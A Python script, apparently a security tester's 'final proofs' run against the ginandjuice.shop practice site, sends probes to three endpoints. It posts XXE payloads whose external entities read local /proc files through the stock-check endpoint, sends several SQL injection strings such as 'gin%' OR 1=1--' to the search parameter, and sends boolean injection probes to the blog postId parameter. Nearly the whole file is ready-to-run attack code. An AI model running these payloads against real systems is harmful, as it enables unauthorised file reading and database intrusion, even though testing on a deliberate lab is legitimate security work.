#!/usr/bin/env python3
"""IV-13 Phase 7b: ginandjuice final proofs.
(A) stock-checker XXE lock-in: literal storeId controls (64/2/3) to prove the
    entity-resolved storeId produced a file-content-driven result.
(B) searchTerm LIKE-style SQLi payloads (the app may wrap term in %...%).
(C) /blog/post?postId= probes.
stdlib only."""
import json, os, re, time, ssl, urllib.request, urllib.parse, urllib.error, http.cookiejar
from datetime import datetime, timezone, timedelta

BASE = 'https://ginandjuice.shop'
UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 IV13-IndependentVerifier/1.0'
CTX = ssl.create_default_context()
OUT = '/home/z/my-project/scripts/iv_out'
TZ = timezone(timedelta(hours=2))

def build():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj),
                                       urllib.request.HTTPSHandler(context=CTX)), cj

op, cj = build()
try:
    r0 = urllib.request.Request(BASE + '/catalog/product?productId=1', headers={'User-Agent': UA})
    op.open(r0, timeout=25).read()
except Exception:
    pass

def post_xml(xml):
    hdrs = {'User-Agent': UA, 'Content-Type': 'application/xml',
            'Referer': BASE + '/catalog/product?productId=1', 'Origin': BASE}
    r = urllib.request.Request(BASE + '/catalog/product/stock', data=xml.encode(), headers=hdrs, method='POST')
    try:
        resp = op.open(r, timeout=25)
        return resp.status, resp.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return None, repr(e)[:120]

def get(path):
    r = urllib.request.Request(BASE + path, headers={'User-Agent': UA, 'Accept': 'text/html,*/*'})
    try:
        resp = op.open(r, timeout=25)
        return resp.status, resp.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return None, repr(e)[:120]

results = {'ts': datetime.now(TZ).isoformat(timespec='seconds')}

print('--- (A) stock storeId controls + entity lock ---')
def xml_of(pid, sid):
    return ('<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>%s</productId>'
            '<storeId>%s</storeId></stockCheck>' % (pid, sid))

def xml_ent_sid(f):
    return ('<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE stockCheck [<!ENTITY xxe SYSTEM "%s">]>'
            '<stockCheck><productId>1</productId><storeId>&xxe;</storeId></stockCheck>' % f)

A = [('sid-literal-1', xml_of('1', '1')), ('sid-literal-2', xml_of('1', '2')),
     ('sid-literal-3', xml_of('1', '3')), ('sid-literal-64', xml_of('1', '64')),
     ('sid-literal-999', xml_of('1', '999')),
     ('sid-ent-ttl', xml_ent_sid('file:///proc/sys/net/ipv4/ip_default_ttl')),
     ('sid-ent-pidmax', xml_ent_sid('file:///proc/sys/kernel/pid_max')),
     ('pid1-sid-literal-64-again', xml_of('1', '64'))]
results['stock_controls'] = []
for label, xml in A:
    st, body = post_xml(xml)
    results['stock_controls'].append({'label': label, 'status': st, 'body': body[:120], 'len': len(body)})
    print('%-26s %s %r' % (label, st, body[:80]), flush=True)
    time.sleep(0.5)

print('--- (B) searchTerm LIKE-style SQLi ---')
def count_products(html):
    return len(re.findall(r'href="/catalog/product\?productId=', html))

B = ["gin", "gin%' OR 1=1--", "gin%' OR '1'='1'--", "gin' OR 1=1--",
     "gin%' AND 1=2--", "gin%'||'%", "%' OR 1=1--"]
results['search_like'] = []
for term in B:
    st, body = get('/catalog?' + urllib.parse.urlencode({'searchTerm': term}))
    n = count_products(body) if isinstance(body, str) else None
    results['search_like'].append({'term': term, 'status': st,
                                   'len': len(body) if isinstance(body, str) else 0, 'products': n})
    print('searchTerm=%-22r %s len=%-6d products=%s' % (term, st, len(body) if isinstance(body, str) else 0, n), flush=True)
    time.sleep(0.5)

print('--- (C) blog postId probes ---')
C = [('postId=1', 'base'), ('postId=1%27', 'quote'), ('postId=1+AND+1%3D1', 'true'),
     ('postId=1+AND+1%3D2', 'false'), ('postId=100000', 'nonexistent')]
results['blog_postid'] = []
for q, label in C:
    st, body = get('/blog/post?' + q)
    results['blog_postid'].append({'label': label, 'status': st,
                                   'len': len(body) if isinstance(body, str) else 0,
                                   'title': (re.search(r'<title>(.*?)</title>', body, re.S).group(1)[:60] if isinstance(body, str) and re.search(r'<title>(.*?)</title>', body, re.S) else None)})
    print('blog %-12s %s len=%s' % (label, st, len(body) if isinstance(body, str) else 0), flush=True)
    time.sleep(0.5)

with open(os.path.join(OUT, 'gj_final_proofs.json'), 'w') as f:
    json.dump(results, f, indent=1, ensure_ascii=False)
print('\nsaved -> scripts/iv_out/gj_final_proofs.json')
